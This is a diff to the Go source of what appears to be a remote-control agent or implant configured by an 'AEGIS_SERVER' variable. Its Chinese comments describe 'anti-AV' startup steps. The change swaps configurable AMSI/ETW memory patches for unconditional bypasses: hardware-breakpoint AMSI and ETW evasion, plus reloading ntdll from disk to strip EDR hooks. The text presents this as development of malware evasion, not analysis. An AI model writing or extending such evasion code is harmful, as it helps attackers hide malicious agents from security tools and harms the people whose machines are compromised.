@@ -135,19 +135,20 @@ func runAgent() {
 
 	cfg := config.DefaultAgentConfig()
 
-	// === AMSI/ETW 绕过（Windows，仅在配置禁用时执行 patch）===
-	if !cfg.AMSIEnabled {
-		if err := evasion.AMSIBypassMemoryPatch(); err != nil {
-			log.Printf("[AGENT] AMSI bypass failed: %v", err)
-		}
+	// === 免杀启动序列：硬件断点 + API Unhooking（无内存 patch）===
+	// AMSI/ETW: 使用硬件断点绕过（非 patch，不修改 .text 节，避免 ETW 监控）
+	// RefreshPE: 从磁盘重载 ntdll.dll .text，清除 EDR inline hooks
+	if err := evasion.RefreshPE(); err != nil {
+		log.Printf("[AGENT] RefreshPE failed (expected on non-Windows or if PE reload blocked): %v", err)
 	}
-	if !cfg.ETWEnabled {
-		if err := evasion.ETWBypassMemoryPatch(); err != nil {
-			log.Printf("[AGENT] ETW patch failed: %v", err)
-		}
+	if err := evasion.AmsiBypass(); err != nil {
+		log.Printf("[AGENT] AMSI hardware breakpoint bypass failed: %v", err)
+	}
+	if err := evasion.ETWBypassHardwareBreakpoint(); err != nil {
+		log.Printf("[AGENT] ETW hardware breakpoint bypass failed: %v", err)
 	}
 
-	if url := os.Getenv("AEGIS_SERVER"); url != "" {
+	if url := strings.TrimSpace(os.Getenv("AEGIS_SERVER")); url != "" {
 		cfg.ServerURL = url
 		cfg.ServerURLs = []string{url}
 	}
